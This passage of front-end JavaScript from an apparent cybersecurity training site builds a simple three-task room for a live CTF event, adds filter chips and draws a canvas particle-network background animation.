      description: 'Live CTF Event hosted by ' + (ctf.organizers && ctf.organizers[0] ? ctf.organizers[0].name : 'Unknown'),
      tasks: [
        {
          id: 1, 
          title: 'Event Briefing', 
          done: false, 
          content: `<p class="text-gray-300 text-sm mb-4">${desc}</p><div class="bg-[#0d1117] border border-[#30363d] rounded-lg p-3 text-xs text-gray-400 space-y-1"><p><b class="text-white">Format:</b> ${ctf.format}</p><p><b class="text-white">Start:</b> ${start}</p><p><b class="text-white">Finish:</b> ${finish}</p><p><b class="text-white">Prizes:</b> ${ctf.prizes || 'None listed'}</p></div>`, 
          q: 'What is the format of this CTF?', 
          answer: (ctf.format || 'jeopardy').toLowerCase(), 
          hint: 'Look at the Format field in the briefing.', 
          points: 10
        },
        {
          id: 2, 
          title: 'Connect & Register', 
          done: false, 
          content: `<p class="text-gray-300 text-sm mb-4">To play this CTF, you need to register on the organizers official platform. Once registered, you will get access to the actual challenges, infrastructure, and flags.</p><a href="${ctf.url}" target="_blank" class="inline-block bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 px-4 rounded-lg transition mb-4">Go to Official CTF Website</a><p class="text-gray-400 text-xs">Create an account, join a team (or play solo), and verify your email.</p>`, 
          q: 'Have you registered on the official website? (yes/no)', 
          answer: 'yes', 
          hint: 'Just type yes once you have registered.', 
          points: 50
        },
        {
          id: 3, 
          title: 'Submit your Team Name', 
          done: false, 
          content: `<p class="text-gray-300 text-sm mb-4">Once you have started playing, drop your team name below so we can track your position on the global CTFtime scoreboard!</p><pre class="bg-[#0d1117] text-emerald-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4"># Hack the planet!</pre>`, 
          q: 'Are you ready to hack?', 
          answer: 'yes', 
          hint: 'Type yes', 
          points: 100
        }
      ]
    };
    ROOMS.push(room);
  }
  openRoom(room.id);
}

function filterCTFs() { renderCTFs(); }

function setCTFFilter(fmt) {
  ctfFilter = fmt;
  document.querySelectorAll('.ctf-chip').forEach(c => {
    c.className = 'ctf-chip text-xs font-bold px-4 py-1.5 rounded-full border border-gray-700 text-gray-400 bg-transparent hover:border-emerald-500/50 transition';
  });
  event.currentTarget.className = 'ctf-chip ctf-chip-active text-xs font-bold px-4 py-1.5 rounded-full border border-emerald-500 text-emerald-400 bg-emerald-500/10';
  renderCTFs();
}

// Auto-load CTFs on page load
loadCTFs();

// ═══════════════════════════════════════════════════════════
//  CYBER THREAD (PARTICLE NETWORK) ANIMATION
// ═══════════════════════════════════════════════════════════
const canvas = document.getElementById('cyber-bg');
const ctx = canvas.getContext('2d');
let width, height;
let particles = [];

function resizeCanvas() {
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

class Particle {
    constructor() {
        this.x = Math.random() * width;
        this.y = Math.random() * height;
        this.vx = (Math.random() - 0.5) * 0.4;
        this.vy = (Math.random() - 0.5) * 0.4;
        this.radius = Math.random() * 1.5 + 0.5;
    }
    update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > width) this.vx = -this.vx;
        if (this.y < 0 || this.y > height) this.vy = -this.vy;
    }
    draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        ctx.fillStyle = '#10b981';
        ctx.fill();
    }
}

for (let i = 0; i < 90; i++) particles.push(new Particle());

function animateParticles() {
    ctx.clearRect(0, 0, width, height);
    for (let i = 0; i < particles.length; i++) {
        particles[i].update();
        particles[i].draw();
        for (let j = i; j < particles.length; j++) {
            const dx = particles[i].x - particles[j].x;
            const dy = particles[i].y - particles[j].y;
            const dist = Math.sqrt(dx * dx + dy * dy);
            if (dist < 130) {
                ctx.beginPath();
                ctx.strokeStyle = `rgba(16, 185, 129, ${(1 - dist/130) * 0.5})`;
                ctx.lineWidth = 0.6;
                ctx.moveTo(particles[i].x, particles[i].y);
                ctx.lineTo(particles[j].x, particles[j].y);
                ctx.stroke();
            }
        }
    }
    requestAnimationFrame(animateParticles);
}
animateParticles();

